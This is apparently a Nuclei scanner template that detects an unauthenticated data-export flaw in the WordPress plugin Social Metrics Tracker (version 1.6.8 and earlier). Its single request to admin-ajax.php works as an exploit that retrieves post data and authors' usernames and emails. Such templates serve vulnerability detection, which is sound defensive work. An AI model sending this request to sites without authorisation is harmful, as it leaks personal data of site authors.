id: wordpress-social-metrics-tracker

info:
  name: Social Metrics Tracker <= 1.6.8 - Unauthorised Data Export
  author: randomrobbie
  severity: medium
  description: |
    The lack of proper authorisation when exporting data from the plugin could allow unauthenticated users to get information about the posts and page of the blog, including their author's username and email.
  reference:
    - https://wpscan.com/vulnerability/f4eed3ba-2746-426f-b030-a8c432defeb2
  metadata:
    max-request: 1
  tags: wordpress,wp-plugin,wp,unauth,wpscan

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Main URL to Post"

      - type: status
        status:
          - 200
# digest: 490a004630440220057b9f0854d90dc315d36288ae55e52d13cd5ccbcd35aa2d45c77a0257c56e1302202bfb55a023d9834b508a370a50b2f6b02c28c5e2df40d5efc648d58121069d43:922c64590222798bb761d5b6d8e72950